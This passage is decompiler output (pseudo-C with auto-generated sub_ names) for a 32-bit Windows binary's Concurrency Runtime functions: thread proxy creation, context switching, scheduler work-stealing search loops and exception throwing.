  char pExceptionObject[16]; // [esp+Ch] [ebp-10h] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !*(_DWORD *)(this + 80)
    || (v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2), *(_DWORD *)(this + 80) != v3) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( _InterlockedDecrement((volatile signed __int32 *)(this + 76)) )
  {
    sub_45C1FD((_DWORD *)this);
  }
  else
  {
    _InterlockedExchange((volatile __int32 *)(this + 84), *(_DWORD *)(this + 80));
    sub_45C173((_DWORD **)this);
    sub_45C92C(v3);
  }
  return 1;
}

//----- (0045C3E0) --------------------------------------------------------
int __thiscall sub_45C3E0(_DWORD *this)
{
  unsigned int v2; // eax
  unsigned int v3; // eax

  v2 = (unsigned int)sub_44AAC3(*(_DWORD *)(*(_DWORD *)(this[7] + 12) + 112));
  if ( v2 && (v2 & 3) == 1 && (v3 = v2 & 0xFFFFFFFE) != 0 && v3 == this[20] )
    *(_DWORD *)(v3 + 16) = 0;
  else
    sub_45C53C(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this + 32))(this, 1);
}

//----- (0045C42E) --------------------------------------------------------
_BYTE *__thiscall sub_45C42E(_DWORD *this, int a2)
{
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !this[20] || this[20] != (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  return sub_44CC2D(*(_DWORD **)(this[7] + 12));
}

//----- (0045C499) --------------------------------------------------------
__int32 __thiscall sub_45C499(int this, int a2)
{
  int v3; // edi
  __int32 result; // eax
  int v5; // ebx

  v3 = *(_DWORD *)(this + 80);
  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( result > 0 )
  {
    v5 = sub_45C1FD((_DWORD *)this);
    result = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    if ( v3 != result )
      return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 4))(v3, v5, a2);
  }
  else
  {
    if ( !result )
      result = sub_45C173((_DWORD **)this);
    *(_DWORD *)(this + 80) = 0;
    if ( a2 == 1 )
      return sub_45C92C(v3);
  }
  return result;
}

//----- (0045C506) --------------------------------------------------------
int __thiscall sub_45C506(int this, int a2, __int16 a3, int a4)
{
  int result; // eax

  if ( !sub_45C1B3((_WORD *)(this + 48), (int)&a2) )
    sub_44B371((DWORD_PTR *)&a2, *(HANDLE *)(this + 8));
  *(_WORD *)(this + 52) = a3;
  result = a2;
  *(_DWORD *)(this + 48) = a2;
  return result;
}

//----- (0045C53C) --------------------------------------------------------
char __thiscall sub_45C53C(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_44AE5E;
  v4 = 0;
  while ( this[20] && !this[21] )
    result = sub_449592((int)v3);
  return result;
}
// 45C53C: using guessed type char var_10[8];

//----- (0045C56A) --------------------------------------------------------
int __thiscall sub_45C56A(_DWORD *this, int a2)
{
  this[16] = a2;
  return (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 12))(a2, this);
}

//----- (0045C58D) --------------------------------------------------------
void __fastcall sub_45C58D(int a1)
{
  DWORD v2; // eax
  int v3; // esi
  void *v4; // [esp-4h] [ebp-18h]
  int v5[2]; // [esp+Ch] [ebp-8h] BYREF

  v5[1] = 0;
  v5[0] = 8;
  if ( !*(_DWORD *)(a1 + 36) )
  {
    v4 = (void *)(a1 | 1);
    v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 4) + 16))(*(_DWORD *)(a1 + 4));
    sub_44AAD1(v2, v4);
    while ( !*(_DWORD *)(a1 + 36) )
    {
      (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 64) + 12))(*(_DWORD *)(a1 + 64), a1);
      (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 64) + 16))(*(_DWORD *)(a1 + 64), v5);
      v3 = *(_DWORD *)(a1 + 16);
      *(_DWORD *)(a1 + 64) = 0;
      *(_DWORD *)(a1 + 16) = 0;
      sub_45C633(a1);
      if ( v3 )
        sub_45C499(v3, 1);
      else
        sub_45C92C(a1);
    }
  }
}

//----- (0045C633) --------------------------------------------------------
int __thiscall sub_45C633(int this)
{
  *(_DWORD *)(this + 64) = 0;
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4), this);
}

//----- (0045C651) --------------------------------------------------------
__int32 __thiscall sub_45C651(_DWORD *this, int a2)
{
  int v2; // edx
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
    goto LABEL_8;
  v2 = this[4];
  if ( !v2 )
  {
    if ( a2 == 1 )
      return sub_45C92C((int)this);
LABEL_8:
    sub_42E473(pExceptionObject, (int)"switchState");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a2 == 2 )
    this[4] = 0;
  return sub_45C499(v2, a2);
}

//----- (0045C6A2) --------------------------------------------------------
__int32 __thiscall sub_45C6A2(int this, int a2, int a3)
{
  int v4; // edi
  int (__thiscall ***v5)(void *); // edx
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !v4 )
    v4 = (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(*(_DWORD *)(this + 16) + 28) + 28))(
           *(_DWORD *)(*(_DWORD *)(this + 16) + 28),
           a2);
  v5 = *(int (__thiscall ****)(void *))(this + 16);
  *(_DWORD *)(this + 16) = 0;
  if ( a3 == 1 )
    _InterlockedExchange((volatile __int32 *)(this + 32), 1);
  sub_45C2EB(v5, (int (__thiscall **)(void *))v4);
  if ( a3 != 1 )
    return sub_45C8DF((HANDLE *)v4);
  sub_44AA4D(*(HANDLE *)(v4 + 12), *(HANDLE *)(this + 12), 0xFFFFFFFF, 1);
  return _InterlockedExchange((volatile __int32 *)(this + 32), 0);
}

//----- (0045C759) --------------------------------------------------------
LPVOID __thiscall sub_45C759(_DWORD *this, int a2, int a3)
{
  int *v3; // edi
  int v4; // eax
  LPVOID v5; // esi
  int v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-14h] BYREF
  LPVOID lpParameter; // [esp+1Ch] [ebp-4h]

  this[1] = a2;
  this[5] = a3;
  *this = &Concurrency::details::ThreadProxy::`vftable';
  v3 = (int *)this[1];
  this[6] = 0;
  *((_BYTE *)this + 28) = 0;
  this[8] = 1;
  this[9] = 0;
  v4 = *v3;
  lpParameter = this;
  (*(void (__thiscall **)(int *))(v4 + 8))(v3);
  v5 = lpParameter;
  *((_DWORD *)lpParameter + 10) = _InterlockedIncrement(&dword_4F8078);
  *((_DWORD *)v5 + 3) = sub_44A69C(0);
  v6 = sub_44AC35(0, *((_DWORD *)v5 + 5) << 10, (LPTHREAD_START_ROUTINE)sub_45C948, v5, 0x10000u, (LPDWORD)v5 + 11);
  *((_DWORD *)v5 + 2) = v6;
  if ( !v6 )
  {
    CloseHandle(*((HANDLE *)v5 + 3));
    (*(void (__thiscall **)(_DWORD))(**((_DWORD **)v5 + 1) + 12))(*((_DWORD *)v5 + 1));
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A2C(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVscheduler_worker_creation_error_Concurrency__);
  }
  return v5;
}
// 494520: using guessed type void *Concurrency::details::ThreadProxy::`vftable';
// 4F8078: using guessed type int dword_4F8078;
// 45C759: using guessed type _DWORD pExceptionObject[4];

//----- (0045C82C) --------------------------------------------------------
std::regex_error *__thiscall sub_45C82C(std::regex_error *this, struct std::regex_error *a2)
{
  std::regex_error::regex_error(this, a2);
  *(_DWORD *)this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return this;
}
// 493BBC: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (0045C847) --------------------------------------------------------
int __thiscall sub_45C847(void *this)
{
  void *v3; // [esp-4h] [ebp-1Ch]

  v3 = (void *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::ThreadProxy::`vftable';
  CloseHandle(v3);
  sub_44A68E(*((HANDLE *)this + 2));
  return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 1) + 12))(*((_DWORD *)this + 1));
}
// 494520: using guessed type void *Concurrency::details::ThreadProxy::`vftable';

//----- (0045C8A8) --------------------------------------------------------
void *__thiscall sub_45C8A8(void *Block, char a2)
{
  sub_45C847(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0045C8CA) --------------------------------------------------------
BOOL __thiscall sub_45C8CA(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-4h]

  v2 = (void *)this[3];
  this[9] = 1;
  return SetEvent(v2);
}

//----- (0045C8DB) --------------------------------------------------------
int __thiscall sub_45C8DB(_DWORD *this)
{
  return this[10];
}

//----- (0045C8DF) --------------------------------------------------------
BOOL __thiscall sub_45C8DF(HANDLE *this)
{
  return SetEvent(this[3]);
}

//----- (0045C8E9) --------------------------------------------------------
BOOL __thiscall sub_45C8E9(_DWORD *this, int nPriority)
{
  void *v3; // [esp-8h] [ebp-8h]

  v3 = (void *)this[2];
  this[6] = nPriority;
  return sub_44AA0B(v3, nPriority);
}

//----- (0045C901) --------------------------------------------------------
char __thiscall sub_45C901(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[8] )
  {
    v4 = 0;
    v5 = sub_44AE5E;
    do
      result = sub_449592((int)v3);
    while ( !this[8] );
  }
  return result;
}
// 45C901: using guessed type char var_10[8];

//----- (0045C92C) --------------------------------------------------------
__int32 __thiscall sub_45C92C(int this)
{
  volatile __int32 *v1; // esi

  v1 = (volatile __int32 *)(this + 32);
  _InterlockedExchange((volatile __int32 *)(this + 32), 1);
  WaitForSingleObjectEx(*(HANDLE *)(this + 12), 0xFFFFFFFF, 0);
  return _InterlockedExchange(v1, 0);
}

//----- (0045C948) --------------------------------------------------------
int __stdcall sub_45C948(LPVOID lpThreadParameter)
{
  WaitForSingleObjectEx(*((HANDLE *)lpThreadParameter + 3), 0xFFFFFFFF, 0);
  _InterlockedExchange((volatile __int32 *)lpThreadParameter + 8, 0);
  (*(void (__thiscall **)(LPVOID))(*(_DWORD *)lpThreadParameter + 20))(lpThreadParameter);
  (*(void (__thiscall **)(LPVOID, int))(*(_DWORD *)lpThreadParameter + 16))(lpThreadParameter, 1);
  sub_44ABBF(0);
  return 0;
}

//----- (0045C998) --------------------------------------------------------
int *__thiscall sub_45C998(int *this, int a2, int a3, int a4, int a5)
{
  *this = a2 & 0xFFFFFFF;
  this[1] = a4;
  this[3] = a5;
  this[2] = a3;
  return this;
}

//----- (0045C9BD) --------------------------------------------------------
bool __thiscall sub_45C9BD(unsigned int *this, int a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this + 4;
  v3 = sub_450CAF((int)&a2, this[4]);
  return sub_451410(v2, &a2, v3) != 0;
}

//----- (0045C9E7) --------------------------------------------------------
char __thiscall sub_45C9E7(int this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
  v3 = v2 - 1;
  if ( !v3 )
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this + 12) + 44);
    return v6 == a2[2];
  }
  v4 = v3 - 1;
  if ( !v4 )
  {
    v6 = *(_DWORD *)(this + 8);
    return v6 == a2[2];
  }
  return v4 == 1 && sub_45C9BD(*(unsigned int **)(this + 12), a2[2]);
}

//----- (0045CA32) --------------------------------------------------------
bool __thiscall sub_45CA32(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
  v3 = v2 - 1;
  if ( v3 )
  {
    v4 = v3 - 1;
    if ( v4 )
    {
      if ( v4 != 1 )
        return 0;
      v6 = this[2];
    }
    else
    {
      v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 48);
    }
  }
  else
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 44);
  }
  return v6 == a2[2];
}

//----- (0045CA7E) --------------------------------------------------------
_DWORD *__thiscall sub_45CA7E(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = 1;
  this[1] = sub_44CC5D((_DWORD *)(a2 + 4));
  result = this;
  this[2] = a2;
  return result;
}

//----- (0045CAA4) --------------------------------------------------------
unsigned __int32 __thiscall sub_45CAA4(_DWORD *this, int a2)
{
  unsigned __int32 v3; // edx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  if ( *(_DWORD *)((a2 << 7) + this[23]) <= 1u )
    return 0;
  savedregs = (int)&savedregs;
  v3 = *(_DWORD *)((a2 << 7) + this[23]);
  if ( v3 > 1 && v3 == _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 1, v3) )
    return v3;
  else
    return 0;
}

//----- (0045CAF5) --------------------------------------------------------
int __thiscall sub_45CAF5(int *this)
{
  int v3; // eax

  if ( (*(_BYTE *)this & 0x18) != 0 && !sub_45D165(this) )
    return 0;
  if ( *this == 2 )
  {
    v3 = sub_45A713((_DWORD *)this[1], this[2], 0);
LABEL_8:
    this[2] = v3;
    if ( v3 )
    {
      *(_BYTE *)(v3 + 179) |= 1u;
      *this = 1;
    }
    return this[2];
  }
  if ( *this == 4 )
  {
    v3 = sub_45A713((_DWORD *)this[1], this[2], 1);
    goto LABEL_8;
  }
  return this[2];
}

//----- (0045CB42) --------------------------------------------------------
int __thiscall sub_45CB42(_DWORD *this, int a2)
{
  int result; // eax

  if ( *this == 2 )
  {
    result = sub_458FAE(a2, this[1], this[2], 0);
  }
  else
  {
    result = *this - 4;
    if ( *this == 4 )
      result = sub_458FAE(a2, this[1], this[2], 1);
  }
  this[2] = a2;
  *this = 1;
  return result;
}

//----- (0045CB7C) --------------------------------------------------------
char __thiscall sub_45CB7C(_QWORD *this, __int64 a2)
{
  char result; // al

  if ( (unsigned __int64)(a2 - this[3]) <= 0x3E8 )
    return 0;
  result = 1;
  this[3] = a2;
  return result;
}

//----- (0045CBB2) --------------------------------------------------------
char __thiscall sub_45CBB2(_DWORD *this, _DWORD *a2, int *a3, char a4)
{
  int v5; // eax
  _DWORD *v6; // eax
  int v8; // eax
  _DWORD *v9; // eax
  _DWORD v10[3]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a4 )
  {
    if ( this[3] < 0x65u )
    {
      if ( a3[5] - a3[4] > 0 )
      {
        v8 = sub_4575FD(a3 + 4);
LABEL_11:
        if ( v8 )
        {
          v9 = sub_45CA7E(v10, v8);
          *a2 = *v9;
          a2[1] = v9[1];
          a2[2] = v9[2];
          ++this[3];
          return 1;
        }
      }
    }
    else if ( this[3] < 0x7Fu )
    {
      v8 = sub_45DF3F(a3);
      goto LABEL_11;
    }
    this[3] = 0;
    return 0;
  }
  if ( a3[5] - a3[4] > 0 )
  {
    v5 = sub_4575FD(a3 + 4);
    if ( v5 )
    {
      v6 = sub_45CA7E(v10, v5);
      *a2 = *v6;
      a2[1] = v6[1];
      a2[2] = v6[2];
      return 1;
    }
  }
  return 0;
}
// 45CBB2: using guessed type _DWORD var_C[3];

//----- (0045CC41) --------------------------------------------------------
int __thiscall sub_45CC41(_DWORD *this, int *a2, int a3)
{
  int v3; // edi
  int i; // esi
  int v5; // edx
  int result; // eax

  v3 = this[11];
  for ( i = 0; i < v3; ++i )
  {
    v5 = (i + *a2 + (a3 != -1)) % v3;
    if ( v5 == a3 )
      break;
    result = *(_DWORD *)(this[8] + 4 * v5);
    if ( result )
    {
      *a2 = v5;
      return result;
    }
  }
  return 0;
}

//----- (0045CC8E) --------------------------------------------------------
int __thiscall sub_45CC8E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 4;
  v3 = this[44];
  result = sub_4503FE(v3, this[20], a2, this + 4);
  if ( !result )
  {
    if ( v3 )
      return sub_4503FE(0, v3, a2, v2);
  }
  return result;
}

//----- (0045CCC9) --------------------------------------------------------
int __thiscall sub_45CCC9(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 24;
  v3 = this[45];
  result = sub_4503FE(v3, this[40], a2, this + 24);
  if ( !result )
  {
    if ( v3 )
      return sub_4503FE(0, v3, a2, v2);
  }
  return result;
}

//----- (0045CD07) --------------------------------------------------------
char __stdcall sub_45CD07(_DWORD *a1, int *a2, char a3)
{
  int v3; // eax
  char result; // al
  int v5; // [esp+Ch] [ebp-4h]

  if ( a3 )
  {
    v3 = sub_45A746(a2);
    if ( v3 )
    {
      *a1 = 2;
      a1[1] = a2;
      a1[2] = v3;
      return 1;
    }
  }
  else if ( sub_45A7A0(a2) )
  {
    result = 1;
    *a1 = 8;
    a1[1] = a2;
    a1[2] = v5;
    return result;
  }
  return 0;
}
// 45CD53: variable 'v5' is possibly undefined

//----- (0045CD5E) --------------------------------------------------------
char __thiscall sub_45CD5E(_DWORD *this, _DWORD *a2, int *a3, char a4, int a5, char a6)
{
  int v6; // esi
  int *v8; // esi

  v6 = a3[64];
  if ( !sub_45DE02(this, (int)a3, 0, a5, a6) && sub_45CD07(a2, a3, a4) )
    return 1;
  if ( a5 )
    v8 = *(int **)(v6 + 12);
  else
    v8 = *(int **)(v6 + 16);
  while ( v8 )
  {
    if ( !sub_45DE02(this, (int)v8, (int)a3, a5, a6) && sub_45CD07(a2, v8, a4) )
      return 1;
    v8 = (int *)v8[65];
  }
  return 0;
}

//----- (0045CDDF) --------------------------------------------------------
char __stdcall sub_45CDDF(_DWORD *a1, int a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 12))(a2);
  if ( !v2 )
    return 0;
  v3 = sub_45CA7E(v5, v2);
  result = 1;
  *a1 = *v3++;
  a1[1] = *v3;
  a1[2] = v3[1];
  return result;
}
// 45CDDF: using guessed type int var_C[3];

//----- (0045CE1C) --------------------------------------------------------
char __thiscall sub_45CE1C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // esi
  int v7; // esi

  v5 = *(_DWORD *)(a3 + 256);
  if ( !sub_45DE02(this, a3, 0, a4, a5) && sub_45CDDF(a2, a3) )
    return 1;
  if ( a4 )
    v7 = *(_DWORD *)(v5 + 12);
  else
    v7 = *(_DWORD *)(v5 + 16);
  while ( v7 )
  {
    if ( !sub_45DE02(this, v7, a3, a4, a5) && sub_45CDDF(a2, v7) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (0045CE97) --------------------------------------------------------
char __stdcall sub_45CE97(int *a1, int a2, char a3, char a4)
{
  void *v4; // eax
  char result; // al
  int v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+10h] [ebp-4h]

  if ( a4 )
  {
    v4 = sub_45ADE3(a2, a3);
    if ( v4 )
    {
      v6 = 4;
LABEL_4:
      v7 = (int)v4;
      result = 1;
      *a1 = v6;
      a1[1] = a2;
      a1[2] = v7;
      return result;
    }
  }
  else
  {
    v4 = sub_45A9AA(a2);
    if ( v4 )
    {
      v6 = 16;
      goto LABEL_4;
    }
  }
  return 0;
}

//----- (0045CEEA) --------------------------------------------------------
char __thiscall sub_45CEEA(_DWORD *this, int *a2, int a3, char a4, int a5, char a6)
{
  int v7; // esi
  int v9; // [esp+8h] [ebp-4h]

  v9 = *(_DWORD *)(a3 + 256);
  if ( !sub_45DE02(this, a3, 0, a5, a6) && sub_45CE97(a2, a3, a6, a4) )
    return 1;
  if ( a5 )
    v7 = *(_DWORD *)(v9 + 12);
  else
    v7 = *(_DWORD *)(v9 + 16);
  while ( v7 )
  {
    if ( !sub_45DE02(this, v7, a3, a5, a6) && sub_45CE97(a2, v7, a6, a4) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (0045CF78) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_45CF78(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  if ( *this == 2 )
  {
    sub_45DFA3(this[2]);
    return sub_451ACE(*(_DWORD *)(*(_DWORD *)(this[1] + 256) + 4), this[2]);
  }
  else
  {
    result = (PSLIST_ENTRY)(*this - 4);
    if ( *this == 4 )
      return (PSLIST_ENTRY)(*(int (__cdecl **)(_DWORD))(this[2] + 12))(this[2]);
  }
  return result;
}

//----- (0045CFBB) --------------------------------------------------------
void __thiscall sub_45CFBB(int this, signed __int64 a2)
{
  if ( (unsigned __int64)(a2 - *(_QWORD *)(this + 416)) > 0x7D0 )
    sub_451522((_DWORD *)this, a2);
}

//----- (0045CFF4) --------------------------------------------------------
char __thiscall sub_45CFF4(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*this + 8))(*this);
  if ( !v2 )
    return 0;
  v3 = sub_45CA7E(v5, v2);
  result = 1;
  *a2 = *v3++;
  a2[1] = *v3;
  a2[2] = v3[1];
  return result;
}
// 45CFF4: using guessed type int var_C[3];

//----- (0045D030) --------------------------------------------------------
bool __stdcall sub_45D030(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 1) != 0 && sub_45CDDF(a2, (int)a1)
      || (a4 & 0xA) != 0 && sub_45CD07(a2, a1, (a4 & 2) != 0)
      || (a4 & 0x14) != 0 && sub_45CE97(a2, (int)a1, a3, (a4 & 4) != 0);
}

//----- (0045D09D) --------------------------------------------------------
bool __stdcall sub_45D09D(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 0x14) != 0 && sub_45CE97(a2, (int)a1, a3, (a4 & 4) != 0)
      || (a4 & 0xA) != 0 && sub_45CD07(a2, a1, (a4 & 2) != 0)
      || (a4 & 1) != 0 && sub_45CDDF(a2, (int)a1);
}

//----- (0045D10B) --------------------------------------------------------
__int64 __thiscall sub_45D10B(_DWORD *this, int a2, int a3)
{
  __int64 result; // rax

  this[3] = 0;
  *this = a2;
  this[2] = *(_DWORD *)(a2 + 144);
  this[1] = **(_DWORD **)(a2 + 80);
  result = j____crtGetTickCount64();
  *((_QWORD *)this + 3) = result;
  *((_QWORD *)this + 2) = result;
  if ( a3 == 1 )
  {
    this[8] = sub_45D1E4;
    this[9] = sub_45D481;
  }
  else
  {
    this[8] = sub_45D9E8;
    this[9] = sub_45DAFB;
  }
  return result;
}
// 44A95D: using guessed type __int64 j____crtGetTickCount64(void);

//----- (0045D165) --------------------------------------------------------
bool __thiscall sub_45D165(void *this)
{
  volatile __int32 *v2; // ecx
  char v3; // al
  int v4; // edi
  int v5; // eax
  _BYTE *v7; // [esp+8h] [ebp-4h] BYREF

  if ( *(_DWORD *)this == 8 )
  {
    v5 = sub_45A746(*((int **)this + 1));
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 2;
    goto LABEL_10;
  }
  if ( *(_DWORD *)this != 16 )
    return (*(_DWORD *)this & 0x18) == 0;
  v2 = (volatile __int32 *)*((_DWORD *)this + 2);
  if ( v2 != (volatile __int32 *)1 )
  {
    v5 = sub_45BB64(v2, 0);
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 4;
LABEL_10:
    *((_DWORD *)this + 2) = v5;
    return (*(_DWORD *)this & 0x18) == 0;
  }
  v3 = sub_45A4EA((volatile signed __int32 *)(*((_DWORD *)this + 1) + 52), &v7);
  v4 = v3 != 0 ? (unsigned int)v7 : 0;
  if ( v4 )
  {
    sub_45BF1A(v3 != 0 ? v7 : 0, 1);
    *((_DWORD *)this + 2) = v4;
    *(_DWORD *)this = 4;
  }
  return (*(_DWORD *)this & 0x18) == 0;
}

//----- (0045D1E4) --------------------------------------------------------
char __thiscall sub_45D1E4(int this, int *a2, int *a3, char a4, char a5)
{
  int *v5; // edi
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  int v15; // esi
  char v16; // al
  int *v17; // eax
  _DWORD *v18; // ecx
  _DWORD *v19; // esi
  _DWORD *v20; // edi
  _DWORD *v21; // esi
  int v22; // [esp+8h] [ebp-2Ch] BYREF
  int v23[3]; // [esp+Ch] [ebp-28h] BYREF
  int v24; // [esp+18h] [ebp-1Ch]
  _DWORD *v25; // [esp+1Ch] [ebp-18h]
  int v26; // [esp+20h] [ebp-14h]
  int v27; // [esp+24h] [ebp-10h]
  int *v28; // [esp+28h] [ebp-Ch]
  _DWORD *v29; // [esp+2Ch] [ebp-8h]
  char v30; // [esp+33h] [ebp-1h]

  v5 = a2;
  v30 = 0;
  if ( sub_45CFF4((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_45CFBB(v9, TickCount64);
  if ( sub_45CB7C((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_45095A(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_45DF3F(v12 - 53);
            if ( v11 )
            {
              v13 = sub_45CA7E(v23, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v30 = 1;
              break;
            }
          }
        }
        else if ( sub_45D030(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v25 = *(_DWORD **)(*(_DWORD *)this + 84);
  if ( v30 )
  {
LABEL_44:
    v19 = (_DWORD *)v5[1];
    v20 = (_DWORD *)v19[2];
    sub_45DDB6(v19, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    v21 = v19 + 3;
    LOBYTE(v26) = 0;
    if ( (*v21 & 0xFFFFFFF) != 0 )
    {
      sub_452901(&v22, (_DWORD *)(*(_DWORD *)this + 148));
      if ( sub_45CA32(&v22, v21) )
        LOBYTE(v26) = 1;
    }
    sub_457ABE(*(_DWORD *)this, v26, v20 == v25);
  }
  else
  {
    v15 = !*(_BYTE *)(v14 + 96) && !sub_457057(v14) && !a4;
    v16 = v30;
    LOBYTE(v26) = 1;
    while ( v15 <= 2 )
    {
      v27 = dword_494538[v15];
      v28 = a3;
      v29 = v25;
      if ( v25 )
      {
        while ( 1 )
        {
          v17 = (int *)sub_45CAA4(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
          if ( v17 )
          {
            if ( sub_45D030(v17, v5, a4, a5) )
              break;
          }
          if ( (_BYTE)v26 && (a5 & 1) != 0 && sub_45CBB2((_DWORD *)this, v5, *(int **)this, 0) )
            break;
          v24 = a5 & 1;
          if ( (a5 & 1) != 0 )
          {
            if ( sub_45D7DB(this, v5, v29, (int)v28, v26, v27, a5, a4) )
              break;
          }
          if ( (a5 & 0xA) != 0 && sub_45D6DF(this, v5, v29, v28, (a5 & 2) != 0, v27, a5, a4)
            || (a5 & 0x14) != 0 && sub_45D8E9(this, v5, v29, (int)v28, (a5 & 4) != 0, v27, a5, a4)
            || v24 && v15 == 2 && sub_45DED0(this, v5, (_DWORD *)v29[1], *(int **)this) )
          {
            break;
          }
          v18 = *(_DWORD **)(this + 4);
          v28 = 0;
          LOBYTE(v26) = 0;
          v29 = (_DWORD *)sub_4509CB(v18, (int)v25, (int)v29);
          if ( !v29 )
          {
            v16 = v30;
            goto LABEL_42;
          }
        }
        v30 = 1;
        goto LABEL_44;
      }
LABEL_42:
      ++v15;
      if ( v16 )
      {
        v30 = v16;
        goto LABEL_44;
      }
    }
  }
  return v30;
}
// 44A95D: using guessed type __int64 j____crtGetTickCount64(void);
// 494538: using guessed type int dword_494538[];
// 45D1E4: using guessed type int var_28[3];

//----- (0045D481) --------------------------------------------------------
